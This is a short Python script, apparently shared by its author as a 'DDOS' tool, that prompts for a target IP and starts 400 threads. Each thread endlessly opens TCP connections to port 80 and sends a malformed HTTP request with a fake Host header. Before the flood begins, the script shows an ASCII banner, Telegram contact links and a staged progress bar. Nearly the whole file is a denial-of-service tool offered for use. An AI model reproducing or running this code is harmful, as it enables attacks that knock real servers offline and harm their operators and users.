print("ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ")
print ('''                  S M 3 R M C
          ___     ___     ___     ___   
         |   \   |   \   / _ \   / __|  
         | |) |  | |) | | (_) |  \__ \  
         |___/   |___/   \___/   |___/
>--------------------------------------------->
                • Version 1.0 •
                     ☆☆☆
               • C0d3d by Sm3R •
┌─────────────────────────────────────────────┐
│         lotfan be .gov ddos nazanid       │
├─────────────────────────────────────────────┤
├─────────────────────────────────────────────┤
│ Telegram : t.me/imsmer │t.me/sm3rmc
└─────────────────────────────────────────────┘''')

import socket, os, time
import threading



target = input("Enter target ip ~>  ")
fake_ip = "40.199.23.23"
port = 80

counter = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /"+target+"HTTP/1.1\r\n").encode('ascii'), (target,port))
        s.sendto(("Host:"+fake_ip+"\r\n\r\n").encode('ascii'),(target,port))
 
        global counter
        counter += 1
        print("P A C K E T ", counter, " S E N T ! ! !")
        
        
        s.close()
 
print(" [                    ]~>0% ")
time.sleep(1)
print(" [•                   ]~>5% ")
time.sleep(1)
print(" [••                  ]~>10% ")
time.sleep(1)
print(" [•••                 ]~>15% ")
time.sleep(1)
print(" [••••                ]~>20% ")
time.sleep(1)
print(" [•••••               ]~>25% ")
time.sleep(1)
print(" [••••••              ]~>30% ")
time.sleep(1)
print(" [•••••••             ]~>35% ")
time.sleep(1)
print(" [••••••••            ]~>40% ")
time.sleep(1)
print(" [•••••••••           ]~>45% ")
time.sleep(1)
print(" [••••••••••          ]~>50% ")
time.sleep(1)
print(" [•••••••••••         ]~>55% ")
time.sleep(1)
print(" [••••••••••••        ]~>60% ")
time.sleep(1)
print(" [•••••••••••••       ]~>65% ")
time.sleep(1)
print(" [••••••••••••••      ]~>70% ")
time.sleep(1)
print(" [•••••••••••••••     ]~>75% ")
time.sleep(1)
print(" [••••••••••••••••    ]~>80% ")
time.sleep(1)
print(" [••••••••••••••••    ]~>85% ")
time.sleep(1)
print(" [•••••••••••••••••   ]~>90% ")
time.sleep(1)
print(" [••••••••••••••••••  ]~>95% ")
time.sleep(1)
print(" [••••••••••••••••••••]~>100% ")
time.sleep(1)
print(" ! ! ! • ATTACK HAS STARTED • ! ! ! ")
time.sleep(1)
 
 
for i in range(400):
 thread = threading.Thread(target=attack)
 thread.start()
